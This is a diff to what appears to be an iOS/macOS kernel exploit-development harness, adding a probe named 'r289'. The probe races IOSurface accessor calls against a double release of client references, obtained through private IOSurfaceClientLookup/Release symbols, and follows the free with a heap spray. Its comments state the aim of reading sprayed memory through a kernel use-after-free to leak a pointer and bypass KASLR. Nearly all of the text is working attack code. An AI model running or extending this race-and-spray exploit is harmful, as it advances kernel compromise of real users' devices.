@@ -2216,6 +2216,214 @@ static void r288_probe(void) {
     fflush(stdout);
 }
 
+/* r289: Alternative race primitives — SetValue/CopyValue/GetSeed race.
+ * r288 CONFIRMED: Framework reconnects stale refs by ID. No type confusion.
+ * The ONLY UAF is r284's kernel-side race (Lock dereferences +0xD8 while
+ * ClientRelease frees). MTE catches it (sync tag fault → panic).
+ *
+ * NEW APPROACH: Instead of IOSurfaceLock (which accesses +0xD8), try other
+ * operations that access different offsets or use different pointer paths:
+ *   - IOSurfaceGetSeed: might read a simple field (no pointer chase)
+ *   - IOSurfaceSetValue: writes to property dict (pointer to dict at some offset)
+ *   - IOSurfaceCopyValue: reads from property dict
+ *   - IOSurfaceGetUseCount: reads a counter field
+ *   - IOSurfaceIncrementUseCount/DecrementUseCount: modify counter
+ *
+ * If ANY of these accesses a field that is NOT a pointer (e.g., an integer
+ * field), the UAF read gives us a leaked integer from the replacement
+ * allocation, which could be a kernel pointer → KASLR bypass.
+ *
+ * The race pattern:
+ *   Thread A: tight loop calling GetSeed/GetUseCount/etc
+ *   Thread B: at the right moment, ClientRelease×2 (free)
+ *   Thread C: immediately spray
+ *   If Thread A reads from the freed-then-sprayed memory, it gets spray data
+ *
+ * Unlike Lock (+0xD8 pointer chase → crash), GetSeed might just read an int.
+ */
+static volatile int r289_go = 0;
+static volatile int r289_freed = 0;
+static volatile int r289_done = 0;
+
+struct r289_ctx {
+    IOSurfaceRef surf;
+    uint32_t surfID;
+    uint32_t seed_before;
+    uint32_t seed_after[1000];
+    int seed_count;
+    int usecount_before;
+    int usecount_after[1000];
+    int uc_count;
+    size_t allocsize_before;
+    size_t allocsize_after[1000];
+    int as_count;
+    int width_before;
+    int width_after[1000];
+    int w_count;
+};
+
+static void *r289_reader_thread(void *arg) {
+    struct r289_ctx *ctx = (struct r289_ctx *)arg;
+    while (!r289_go) { /* spin */ }
+    int si = 0, ui = 0, ai = 0, wi = 0;
+    while (!r289_done && si < 1000) {
+        ctx->seed_after[si++] = IOSurfaceGetSeed(ctx->surf);
+        if (ui < 1000) ctx->usecount_after[ui++] = (int)IOSurfaceGetUseCount(ctx->surf);
+        if (ai < 1000) ctx->allocsize_after[ai++] = IOSurfaceGetAllocSize(ctx->surf);
+        if (wi < 1000) ctx->width_after[wi++] = (int)IOSurfaceGetWidth(ctx->surf);
+    }
+    ctx->seed_count = si;
+    ctx->uc_count = ui;
+    ctx->as_count = ai;
+    ctx->w_count = wi;
+    return NULL;
+}
+
+static void *r289_freer_thread(void *arg) {
+    struct r289_ctx *ctx = (struct r289_ctx *)arg;
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+
+    IOSurfaceClientRef cl1 = clLookup(ctx->surfID);
+    IOSurfaceClientRef cl2 = clLookup(ctx->surfID);
+
+    while (!r289_go) { /* spin */ }
+    usleep(50);
+
+    CFRelease(ctx->surf);
+    clRelease(cl1);
+    clRelease(cl2);
+    r289_freed = 1;
+    return NULL;
+}
+
+static void r289_probe(void) {
+    rlog("\n=== r289: Alternative Race Primitives ===\n");
+    fflush(stdout);
+
+    typedef IOSurfaceRef (*surfLookup_t)(uint32_t);
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    surfLookup_t surfLookup = (surfLookup_t)dlsym(iosurfH, "IOSurfaceLookup");
+
+    /* Part 1: Safe read-only race with GetSeed/GetWidth/GetAllocSize/GetUseCount */
+    rlog("\n--- Part 1: Read-only accessor race (3 trials) ---\n");
+    fflush(stdout);
+
+    for (int trial = 0; trial < 3; trial++) {
+        r289_go = 0; r289_freed = 0; r289_done = 0;
+
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        struct r289_ctx ctx;
+        memset(&ctx, 0, sizeof(ctx));
+        ctx.surf = IOSurfaceCreate(p);
+        CFRelease(p);
+        ctx.surfID = IOSurfaceGetID(ctx.surf);
+        ctx.seed_before = IOSurfaceGetSeed(ctx.surf);
+        ctx.usecount_before = (int)IOSurfaceGetUseCount(ctx.surf);
+        ctx.allocsize_before = IOSurfaceGetAllocSize(ctx.surf);
+        ctx.width_before = (int)IOSurfaceGetWidth(ctx.surf);
+
+        rlog("  [%d] id=%u seed=%u uc=%d alloc=%zu w=%d\n",
+            trial, ctx.surfID, ctx.seed_before, ctx.usecount_before,
+            ctx.allocsize_before, ctx.width_before);
+
+        pthread_t reader, freer;
+        pthread_create(&reader, NULL, r289_reader_thread, &ctx);
+        pthread_create(&freer, NULL, r289_freer_thread, &ctx);
+
+        usleep(1000);
+        r289_go = 1;
+
+        /* Wait for free, then spray */
+        while (!r289_freed) usleep(10);
+        IOSurfaceRef sprays[64];
+        for (int i = 0; i < 64; i++) {
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int sw=128,sh=128,sbpe=4,sbpr=128*4,spf=0x42475241,sas=128*128*4;
+            CFNumberRef swn=CFNumberCreate(NULL,kCFNumberIntType,&sw);
+            CFNumberRef shn=CFNumberCreate(NULL,kCFNumberIntType,&sh);
+            CFNumberRef sbn=CFNumberCreate(NULL,kCFNumberIntType,&sbpe);
+            CFNumberRef srn=CFNumberCreate(NULL,kCFNumberIntType,&sbpr);
+            CFNumberRef spfn=CFNumberCreate(NULL,kCFNumberIntType,&spf);
+            CFNumberRef sasn=CFNumberCreate(NULL,kCFNumberIntType,&sas);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceWidth"),swn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceHeight"),shn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerElement"),sbn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerRow"),srn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfacePixelFormat"),spfn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceAllocSize"),sasn);
+            CFRelease(swn);CFRelease(shn);CFRelease(sbn);CFRelease(srn);CFRelease(spfn);CFRelease(sasn);
+            sprays[i] = IOSurfaceCreate(sp);
+            CFRelease(sp);
+        }
+        usleep(100);
+        r289_done = 1;
+
+        pthread_join(reader, NULL);
+        pthread_join(freer, NULL);
+
+        /* Analyze: did any read return a different value? */
+        int seed_changed = 0, uc_changed = 0, as_changed = 0, w_changed = 0;
+        uint32_t seed_new = ctx.seed_before;
+        int uc_new = ctx.usecount_before;
+        size_t as_new = ctx.allocsize_before;
+        int w_new = ctx.width_before;
+        for (int i = 0; i < ctx.seed_count; i++) {
+            if (ctx.seed_after[i] != ctx.seed_before) {
+                seed_changed++; seed_new = ctx.seed_after[i];
+            }
+        }
+        for (int i = 0; i < ctx.uc_count; i++) {
+            if (ctx.usecount_after[i] != ctx.usecount_before) {
+                uc_changed++; uc_new = ctx.usecount_after[i];
+            }
+        }
+        for (int i = 0; i < ctx.as_count; i++) {
+            if (ctx.allocsize_after[i] != ctx.allocsize_before) {
+                as_changed++; as_new = ctx.allocsize_after[i];
+            }
+        }
+        for (int i = 0; i < ctx.w_count; i++) {
+            if (ctx.width_after[i] != ctx.width_before) {
+                w_changed++; w_new = ctx.width_after[i];
+            }
+        }
+        rlog("  [%d] reads: seed=%d/%d (new=0x%x) uc=%d/%d (new=%d) "
+             "alloc=%d/%d (new=%zu) w=%d/%d (new=%d)\n",
+            trial,
+            seed_changed, ctx.seed_count, seed_new,
+            uc_changed, ctx.uc_count, uc_new,
+            as_changed, ctx.as_count, as_new,
+            w_changed, ctx.w_count, w_new);
+
+        for (int i = 0; i < 64; i++) if (sprays[i]) CFRelease(sprays[i]);
+    }
+
+    rlog("\n*** r289 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r286: Spray-between-free-and-access with MTE tag brute-force.
  * r284 CONFIRMED: Race between ClientRelease + Lock triggers kernel panic
  *   at PC offset 0x33C9380 in kernelcache, accessing IOSurface+0xD8.
@@ -27464,6 +27672,15 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 289) {
+            rlog("*** rounds=289: Alternative Race Primitives ***\n");
+            rlog("  r288 CONFIRMED: Framework reconnects stale refs by ID.\n");
+            rlog("  Testing: GetSeed/GetWidth/GetAllocSize race with free+spray.\n");
+            rlog("  These read simple fields, NOT pointer chains like Lock+0xD8.\n\n");
+            fflush(stdout);
+            r289_probe();
             goto done;
         }
         if (rounds == 288) {
